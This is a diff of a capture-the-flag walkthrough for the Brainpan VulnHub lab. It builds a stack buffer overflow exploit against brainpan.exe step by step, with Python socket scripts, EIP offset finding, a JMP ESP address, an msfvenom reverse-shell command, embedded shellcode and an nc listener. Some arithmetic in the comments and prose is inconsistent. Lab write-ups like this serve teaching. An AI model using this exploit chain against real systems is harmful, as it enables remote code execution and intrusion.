@@ -1,5 +1,6 @@
 Download brainpan from [vulnhub](https://www.vulnhub.com/entry/brainpan-1,51/) and provision it as a VM.
 
+PS. This walkthroug is more focused on buffer overflow part.
 
 # Scanning
 
@@ -72,7 +73,9 @@ Connecting to Windows 7 machine using net-cat, running brainpan.exe.
 
 # Debugging (that Buffer Overflow part)
 
-1. fuzzing
+**Step 1. Fuzzing**
+
+Suspecting the brainpan.exe application is vulnerable to a buffer overflow attack a simple Python fuzzer can be written to test this. 
 ```
 #!/usr/bin/python
 import sys,socket 
@@ -97,11 +100,20 @@ except:
 finally:
 	s.close()
 ``` 
-![de5f4c8f2a83d273b2657c3d6ace40e4.png](/_resources/b565345eab984584ba05e665d5ade53a.png)
+
+The script above creates a string of 100 A characters in the variable buffer, tries to connect to the Windows host on port 9999 and sends the buffer. When done it increments the buffer with 100 A’s and then tries to connect and send the string, which is now 200 A’s again.
+The fuzzer will keep increasing the buffer of A’s each time it runs until it can no longer connect to port 9999 which is an indication the application crashed and is no longer accepting connections. The script can be downloaded here.
+Running the fuzzer with Python reveals it can no longer connect and shows the crash message when it sends around 600 bytes to the application. 
+
 ![b1b97431555eded815d0dcfc8d6b0449.png](/_resources/1421b26ac2044f0d96b9897afbf9e4b4.png)
 
-2. crashing
-Replicating the crash in Immunity debigger
+On the Windows command prompt the buffer of A’s is displayed on the screen, followed by the bytes copied message. It is clearly visible that after this action the application exited to the command prompt and is no longer running. 
+
+![de5f4c8f2a83d273b2657c3d6ace40e4.png](/_resources/b565345eab984584ba05e665d5ade53a.png)
+
+**Step 2. Replicating the Crash**
+
+We know from fuzzing the brainpan.exe application in previous step that it crashes when around 700 bytes are sent. We will replicate this crash while the brainpan.exe application is attached to the debugger to verify what happens. 
 
 ```
 #!/usr/bin/python
@@ -109,7 +121,7 @@ import socket
 import sys
 from time import sleep
 
-buffer = 'A' * 700		#change 600 accordingly
+buffer = 'A' * 700		#change 700 accordingly
 
 try:
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -126,12 +138,26 @@ except:
   sys.exit()
 ```
 
+The script above is a modified version of the fuzzing script and will be used and edited in the remaining steps to develop a working exploit. A variable buffer is created which contains a string of 700 A’s. The script then connects to the application on port 9999 and sends the buffer of 700 A’s. 
+
 ![436a0ad33050356f03454c2b3adaa001.png](/_resources/e8d7579d8bb945e0b402fc52e3bfb231.png)
+
+Returning to the debugger the status bar on the bottom of the screen shows an access violation. In the top right window, we see the EDX and ESP register filled with A’s and the EIP register which displays the value 41414141 which is the hexadecimal representation of the letter A stored in the buffer variable. Looking at the stack window in the bottom right of the screen we see that memory address 005FF910 which is ESP is filled with A’s as well. 
+
 ![161e1bc8d5c8e053dd03774585c51f9a.png](/_resources/8000a9f69d84486bae08e0c00cfbd243.png)
 
-3. finding the offset to EIP register
+Reattach the brainpan.exe application to the debugger by navigating to File > Open and clicking Play like we did in the Debugging: Setting Up the Debugging Environment step. Before continuing make sure the application is in a running state.
+
+**Step 3. Finding the Offset to the EIP Register**
+
+To control the execution flow of the application it is important to control the EIP register. To gain control of this register the exact offset to EIP has to be found so we can fill it with whatever data we want. The ruby script pattern_create.rb can be leveraged to create a unique string of characters to determine the exact offset to the EIP register.
+To do this we copy the crash.py script and modify it with the output of pattern_create.rb. We make the string which will be the new buffer 700 bytes long.
+ 
 `msf-pattern_create -l 700`
+
 ![f3a50c8d00511a9aa5ca4c34c3372542.png](/_resources/31a6c14957a24ec49549f803a934012b.png)
+
+Modifying the script pattern.py we add a variable called pattern and fill it with the string created by pattern_create.rb. Furthermore we modify the buffer variable to include the pattern variable we just added.
 
 ```
 import socket
@@ -157,18 +183,34 @@ except:
   sys.exit()
 
 ```
+
+Running the script.
+
 ![10f68236d57b16116f84f24352aaf281.png](/_resources/a01f2edca42b4ba1a6cbde658172928b.png)
+
+The debugger again shows an access violation in the status bar at the bottom of the screen and is in a paused state. This time the EIP register is filled with a unique value instead of just A’s. The value in EIP is "35724134" and should be noted for later use. 
+
 ![749454d2d150299fece5e3970b517604.png](/_resources/e1207e0ef7974da19a07b401ef4ca4f2.png)
+
+The companion ruby script pattern_offset.rb can be leveraged to find the exact offset to the EIP register by combining it with the unique value from EIP we noted earlier. Running the script with the -l 650 and -q 35724134 parameters shows an exact offset of 524 bytes. 
+
 `msf-pattern_offset -l 3000 -q 35724134`
+
 ![b80b421e33d2728f915b67de7f2a8ae7.png](/_resources/8d9472f8fc0e4a46bae5f668390f8255.png)
 
-4. Controlling the EIP Register
+Make sure to reattach the brainpan.exe application to the debugger.
+
+**Step 4. Controlling the EIP Register**
+
+To make sure we have the correct offset to the EIP register we will modify the script and try to put four B’s in the EIP register. If the offset of 524 is correct running the modified script 4-control-eip.py should display the four B’s in the EIP register instead of the A’s or the unique string from the previous steps. For good measure and clarity, we will pad the buffer variable with some C characters to clearly demonstrate how the buffer variable from our script is represented in memory within Immunity Debugger.
+The buffer variable is modified to include 524 A’s then 4 B’s and 122 C’s. 524 + 4 + 172 = 700 keeping our buffer length the same as before.
+
 ```
 import socket
 import sys
 from time import sleep
 
-buffer = 'A' * 524 + 'B' * 4  + 'C' * 172 # 524 + 4 + 122 = 7000
+buffer = 'A' * 524 + 'B' * 4  + 'C' * 172 # 524 + 4 + 172 = 700
 
 try:
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -185,20 +227,36 @@ except:
   sys.exit()
 
 ```
+
+Running the script.
+
 ![ed4fe3aca81eff5df184df5057350aca.png](/_resources/3d522110e92043a181014fa9addaad65.png)
+
+As expected the application crashes and Immunity Debugger shows an access violation in the status bar at the bottom of the screen. Note however how the EDX register is now filled with A’s while the ESP register is filled with C’s. Also note the EIP register which is filled with 42424242 which represent our four B’s in hexadecimal format. The stack window in the bottom right clearly displays how our A’s are cleanly followed by four B’s and nicely continues with C’s as expected. 
+
 ![c0b3f050c2f7b641ebf0a2c2dbcf3b2a.png](/_resources/d6791370244b48828884310a10256357.png)
+
+Following the memory dump by right clicking on the ESP register and then clicking Follow in Dump in the context menu shows how the memory is built up and clearly indicates a clean transition from A’s to the four B’s and continuing with C’s. This clearly shows how the buffer variable from our script is represented in memory within Immunity Debugger. 
+
 ![0719bd3efdaf4fe1a81bb9294907bed4.png](/_resources/9d5984c85d31463c8931225d68cb5077.png)
+
 ![546d250a9fff0cd39dd985a76842d9da.png](/_resources/fabbd32242884decbcc4b22b62fa151b.png)
 
+Make sure to reattach the brainpan.exe application to the debugger .
 
-5. Finding space for shellcode
+**Step 5. Finding Space for Shellcode**
+
+Now that we have confirmed control over the EIP register, can fill it with data of our choosing and know how our buffer variable is built up in memory we need to find space for our shellcode. A Windows payload is usually about 350 to 450 bytes while our C’s currently only represent 172 bytes in our buffer variable, to small of a space for 450 bytes of shellcode. The simplest way to find space is to just increase the amount of C’s in our buffer variable and test if the application still behaves the same as before.
+
+To do this we modify the script and increase the C’s in the buffer variable by 400 creating a total of 572 C’s. Plenty of space for a Windows reverse shell payload and some extra padding. 
+
 ```
 import socket
 import sys
 from time import sleep
 
-# buffer = 'A' * 524 + 'B' * 4  + 'C' * 122 # 524 + 4 + 122 = 650
-buffer = 'A' * 524 + 'B' * 4  + 'C' * 522 # 122 + 400 = 522
+# buffer = 'A' * 524 + 'B' * 4  + 'C' * 172 # 524 + 4 + 122 = 700
+buffer = 'A' * 524 + 'B' * 4  + 'C' * 572 # 172 + 400 = 572
 
 try:
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -215,10 +273,25 @@ except:
   sys.exit()
 
 ```
+
+Running the script.
+
 ![3db49e61de4388bbd8f47a01e3cabb56.png](/_resources/0e8dae34f97b428498a863144434b387.png)
+
+As expected the debugger again shows an access violation. Following the memory dump by right clicking on the ESP register and then clicking Follow in Dump in the context menu again shows how the buffer is built up in memory. It is clear we now have more C’s than before and successfully increased the space needed to store our shellcode. 
+
 ![716e357d12696afb680a3c540ed6f515.png](/_resources/547dee72ea5d47a9a515cf0209f24d96.png)
 
-6. Finding Bad Characters
+Make sure to reattach the brainpan.exe application to the debugger.
+
+**Step 6. Finding Bad Characters**
+
+Some hexadecimal characters cannot be used in shellcode because they interfere with executing the shellcode correctly. An example of a character that is always bad is \x00 also known as a NULL character or NULL byte. This character signifies the end of a string thus cutting off the string stored in our buffer variable and cutting off the shellcode before it can fully execute.
+
+Other bad characters depend on the application and should be found before shellcode can be generated. We know from the previous steps how the buffer variable is represented in memory as the follow in dump function clearly shows this. We can use this technique to find bad characters that should be excluded from our shellcode.
+
+To find bad characters the 5-find-space.py script is modified with a variable badchars that includes all characters in hexadecimal format apart from the \x00 character. The buffer variable is modified to include the badchars variable instead of the C’s from the previous step.
+
 ```
 import socket
 import sys
@@ -260,16 +333,44 @@ except:
   sys.exit()
 
 ```
+
+Running the script in python.
+
 ![9575aa90096c102544fa269ba9f8a278.png](/_resources/7d5b37f656354eb9aeedcd88412edb74.png)
+
+Looking at the debugger we are greeted by the access violation again. To find bad characters we again have to leverage the follow in dump function for the ESP register and look for signs of our buffer variable being truncated anywhere. The screenshot below shows all hex characters from \x01 all the way through \xFF in memory without any truncation meaning the brainpan.exe application does not have any more bad characters. 
+
 ![e32a2fb892853121e0c7b0b55fdc8451.png](/_resources/7da7d4f3d71941c383c8b68c8408059e.png)
 
-7. Jumping to the ESP Register
+If the string looks truncated or garbled in memory the bad character should be removed from the badchars variable in the 6-find-bad-characters.py script. When removed the script should be run again until no other bad characters are found truncating the output of the buffer variable.
+
+Make sure to reattach the brainpan.exe application to the debugger.
+
+**Step 7. Jumping to the ESP Register**
+
+As should be evident by now the ESP register is consistently filled with the data we want whether it be our buffer of A’s, C’s or the bad characters from the previous step and can conveniently store our shellcode. If we want to execute the shellcode stored in the ESP register we should find a way to redirect the execution flow of the brainpan.exe application to jump to that location in memory. This is where control of the EIP register comes into play.
+
+To jump to ESP we should find a memory location that contains a JMP ESP instruction either within the brainpan.exe application itself or one of its loaded modules. The hexadecimal equivalent of a JMP ESP instruction is \xFF\xE4. Now we need to find a module that has no memory protections such as SafeSEH or ASLR enabled. This can be achieved with the mona.py script.
+
+In the command window at the bottom of Immunity Debugger type !mona modules.
+
 ![69b1d813b8ff5981a9ee48b6ebd46432.png](/_resources/3c07560b32db41c197e3fa534a15a660.png)
+
+A screen like the one below appears with all the loaded modules, their memory address and memory protections. We are looking for a module that has false across the board. False means the protection is not enabled. The only module that satisfies these criteria is the brainpan.exe application itself. 
+
 ![d8c4ab35c1b7f908f7fa8440229edef9.png](/_resources/ea9cbb0d53974ffd89b72d128850aa7f.png)
+
+Now that we have identified a module without memory protections enabled we can leverage mona.py again to look for a memory location with a JMP ESP instruction. This can be achieved with the command !mona find -s “\xff\xe4” -m brainpan.exe. Fortunately, Mona finds a JMP ESP instruction at memory address 311712F3. 
+
 `!mona find -s “\xff\xe4” -m brainpan.exe`
-This means JMP ESP
+
 ![439c5fa2c11b198cf078204ec2af4f2f.png](/_resources/160981cbe1a041a3ae17d45a9885aa1a.png)
+
+To verify if the memory address 311712F3 indeed contains a JMP ESP instruction we can search for the memory address within Immunity Debugger by clicking on the search button at the top of the screen, entering the memory address 311712F3 and then clicking OK. The debugger jumps to the address and we can see that it indeed contains a JMP ESP instruction. 
+
 ![f1427b37b377ad00df34cb178609b89c.png](/_resources/b3be605b9004495d81c59c78141c2686.png)
+
+To verify if we can indeed jump to ESP using this memory address the 6-find-bad-characters.py script is modified to include the memory address with the JMP ESP instruction we discovered. The buffer variable is modified with the memory address that contains the JMP ESP instruction instead of our four B’s we also add back the 522 C’s at the end of the buffer variable instead of the bad characters from the previous step. 
 
 ```
 import socket
@@ -278,7 +379,7 @@ from time import sleep
 
 badchars = ()
 
-buffer = 'A' * 524 + '\xF3\x12\x17\x31'  + 'C' * 522		# JMP ESP noted in little endian
+buffer = 'A' * 524 + '\xF3\x12\x17\x31'  + 'C' * 572		# JMP ESP noted in little endian
 # 311712F3 is in reverse order (memory)
 
 try:
@@ -296,12 +397,28 @@ except:
   sys.exit()
 
 ```
+
+Enter the memory address in reverse. In other words, the memory address 31 17 12 F3 should be noted in hexadecimal format as follows \xF3 \x12 \x17 \x31 within our buffer variable. The modified script can be downloaded here.
+
+Before we run the script we will set a breakpoint on the memory address that contains the JMP ESP instruction within Immunity Debugger. We do this to instruct the debugger to pause before executing instructions beyond that point. This is so we can follow exactly what happens. In Immunity Debugger click on the memory address with the JMP ESP instruction and press the F2 button to set a breakpoint. 
+
 ![7159c7145d255dcc555ce388dad6bb4a.png](/_resources/a7e0c9102e2e468c96070797b1335ca1.png)
 
-8. Generating shell
+Once the breakpoint is reached Immunity Debugger enters a paused state, the status bar indicates a breakpoint is reached at address 311712F3 that contains the JMP ESP instruction. If the application executes further we should expect it to jump to the beginning of the ESP register that contains our C characters from our buffer variable. 
+
+**Step 8. Writing the Exploit**
+
+Now that we control the EIP register, found a memory location with a JMP ESP instruction and confirmed the JMP ESP instruction works as expected and brings us to the beginning of our C’s in the buffer variable it is time to finish the exploit by generating and adding some shellcode instead of the innocent C’s we have been using as padding until now.
+
+Msfvenom can be leveraged to generate a Windows reverse shell shellcode that connects back to a listener on our attacking machine. Make sure to exclude any bad characters that where found in Step 6 with the -b option. The generated shellcode is 351 bytes long which neatly fits in the 572 C’s we have added to our buffer variable. 
+
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.8 LPORT=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c > shellcode.txt`
 
+Now that the shellcode is generated it should be copied so that it can be pasted in the exploit script. 
+
 ![e78148542d4f2ef2f12ab928e81a5497.png](/_resources/7eaf0dad34b84e4f81883a7c5e14a947.png)
+
+To add the shellcode and finish the exploit the script should be modified with a shellcode variable that contains the shellcode generated by Msfvenom. 
 
 ```
 import socket
@@ -334,7 +451,7 @@ shellcode = ("\xdb\xca\xba\x39\xcc\xf8\x8e\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
 "\xd6\x30\x2a\x85\xd7\x10")
 
 
-buffer = 'A' * 524 + '\xF3\x12\x17\x31' + '\x90' * 32 + shellcode + 'C' * 139 
+buffer = 'A' * 524 + '\xF3\x12\x17\x31' + '\x90' * 32 + shellcode + 'C' * 189 
 # 32 NO OPS are added as \x90
 # c = 522-32-351
 
@@ -353,9 +470,18 @@ except:
   sys.exit()
 ```
 
+The buffer variable is modified to contain 32 NOP’s and the new shellcode variable, the NOP’s are added to give the shellcode some room to expand if needed. The 32 bytes of NOP’s and the 351 bytes that contain she shellcode should be subtracted from the 572 C’s in the buffer variable to keep the total size of the buffer the same as it has been until now. 522 - 32 - 351 = 189 so we should pad the buffer with another 189 C’s after we added in the NOP’s and the shellcode variable. 
+
+The exploit is now finished and ready for testing. Before executing the exploit an Ncat listener is prepared to catch the reverse shell connection. 
+
 `nc -nvlp 4444 `
 
+Running the exploit script.
+
 ![0f58501e84e846ccacdeab170936be3a.png](/_resources/718959f3899b4c9d8bc675cea4176f18.png)
+
+The shellcode in the exploit executes and connects back to the Ncat listener.
+
 ![76d51de3a8fa8e7c73dce591080d6f1b.png](/_resources/5ae1e1fd3dfb4d14aa6dfb92d726ff67.png)
 
 
